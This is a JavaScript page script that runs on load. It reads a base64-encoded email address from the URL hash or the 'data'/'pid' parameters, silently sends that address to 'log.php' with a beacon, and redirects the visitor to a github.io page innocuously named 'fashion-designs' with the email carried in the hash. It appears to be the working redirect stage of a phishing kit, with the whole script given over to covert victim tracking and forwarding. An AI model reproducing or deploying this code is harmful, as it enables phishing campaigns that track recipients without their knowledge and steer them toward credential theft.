<script type="text/javascript">
function validateEmail(email) {
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}

function decodeBase64(s) {
    var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
    var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
    for (x = 0; x < L; x++) {
        c = e[s.charAt(x)];
        if (c === undefined) continue;
        b = (b << 6) + c;
        l += 6;
        while (l >= 8) {
            a = (b >>> (l -= 8)) & 0xff;
            if (a || x < (L - 2)) r += w(a);
        }
    }
    return r;
}

function logToConsole(message, data) {
    try {
        console.log("[Redirect Debug]", message, data || "");
    } catch(e) {}
}

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

function processRedirect() {
    try {
        // Try to get email from multiple sources: #hash, ?data=, or ?pid=
        var emailData = null;
        var source = '';

        // 1. Check hash (#)
        var hash = window.location.hash.substring(1);
        if (hash) {
            emailData = hash;
            source = 'hash';
            logToConsole("Found data in hash:", hash);
        }

        // 2. Check ?data= parameter
        if (!emailData) {
            var dataParam = getParameterByName('data');
            if (dataParam) {
                emailData = dataParam;
                source = 'data parameter';
                logToConsole("Found data in data parameter:", dataParam);
            }
        }

        // 3. Check ?pid= parameter
        if (!emailData) {
            var pidParam = getParameterByName('pid');
            if (pidParam) {
                emailData = pidParam;
                source = 'pid parameter';
                logToConsole("Found data in pid parameter:", pidParam);
            }
        }

        if (!emailData) {
            logToConsole("No email data found in hash, data, or pid parameters");
            return;
        }

        // Decode the base64 email
        var decoded = decodeBase64(emailData);
        logToConsole("Decoded once:", decoded);

        // Try double decode if needed
        if (!validateEmail(decoded)) {
            try {
                var doubleDecoded = decodeBase64(decoded);
                if (validateEmail(doubleDecoded)) {
                    decoded = doubleDecoded;
                    logToConsole("Double decoded:", decoded);
                }
            } catch(e) {}
        }

        // Replace $ with @ if needed
        var email = decoded.replace(/\$/g, '@');

        // Final validation
        if (!validateEmail(email)) {
            logToConsole("Invalid email, stopping:", email);
            return;
        }

        // Silent logging
        try {
            navigator.sendBeacon(
                "log.php",
                JSON.stringify({ 
                    email: email,
                    original_data: emailData,
                    source: source,
                    timestamp: new Date().toISOString()
                })
            );
        } catch (e) {}

        // Build the redirect URL with the decoded email as a hash
        var redirectUrl = "https://modest-man001.github.io/fashion-designs/?#" + btoa(email);
        logToConsole("Redirecting to second file with hash:", redirectUrl);

        window.location.replace(redirectUrl);

    } catch (error) {
        console.error("Redirect error:", error);
    }
}

// Run immediately
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', processRedirect);
} else {
    processRedirect();
}
</script>
